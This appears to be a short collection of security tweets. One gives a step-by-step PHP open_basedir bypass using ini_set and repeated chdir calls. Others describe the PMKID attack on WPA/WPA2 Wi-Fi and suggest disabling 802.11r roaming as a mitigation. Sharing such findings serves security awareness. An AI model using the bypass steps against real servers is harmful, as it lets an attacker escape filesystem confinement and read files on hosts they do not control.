Here is an awesome PHP open_basedir bypass by @Blaklis_ 
0. You are open_basedir'ed to /var/www/html
1. Change into a sub-directory.
2. ini_set('open_basedir', '..')
3. chdir('..');chdir('..');chdir('..');....
4. ini_set('open_basedir','/')
5. open_basedir is now set to /, enjoyhttps://twitter.com/Blaklis_/status/1111586655134203904 …

1026948874773164032.text: Disabling QoS & Fat Roaming (802.11r) in access-point config will save you from this, and a bunch of other previously known attacks against WPA/2.

1026947750221504514.text:
New attack on WPA/WPA2 using PMKID (via RSN IE protocol). 
TLDR; you no longer need an existing legit client to target or capture its EAPOL handshake or MiTM.  You still need beefy GPUs for the offline brute-force stage. Requires enabled roaming (802.11r)
